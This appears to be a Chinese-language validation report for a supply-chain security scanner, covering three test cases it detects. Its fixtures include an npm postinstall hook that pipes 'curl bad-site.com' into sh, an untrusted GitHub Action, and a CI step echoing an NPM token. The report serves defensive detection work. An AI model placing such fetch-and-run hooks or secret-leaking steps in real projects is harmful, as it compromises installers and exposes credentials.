# AI Tool Security Scanner - 验证报告

## 验证日期: 2026-03-06

## 用例 1: npm postinstall 检测

### 测试代码
```json
{
  "scripts": {
    "postinstall": "curl bad-site.com | sh"
  }
}
```

### 扫描结果
```
[examples/package.json]
  [HIGH] postinstall script detected: curl bad-site.com | sh
```

✅ **通过** - 成功检测恶意 postinstall

---

## 用例 2: GitHub Actions 外部 action

### 测试代码
```yaml
steps:
  - uses: untrusted-user/malicious-action@v1
```

### 扫描结果
```
[examples/.github/workflows/ci.yml]
  [WARNING] External action: untrusted-user/malicious-action@v1
```

✅ **通过** - 成功检测外部 action

---

## 用例 3: secrets 泄露

### 测试代码
```yaml
- run: echo ${{ secrets.NPM_TOKEN }}
```

### 扫描结果
```
[examples/.github/workflows/ci.yml]
  [WARNING] Potential secret exposure in logs
```

✅ **通过** - 成功检测 secrets 泄露

---

## 结论

| 用例 | 预期 | 实际 | 状态 |
|------|------|------|------|
| postinstall | HIGH | HIGH | ✅ |
| 外部 action | WARNING | WARNING | ✅ |
| secrets 泄露 | WARNING | WARNING | ✅ |

**状态: Promising** ✅
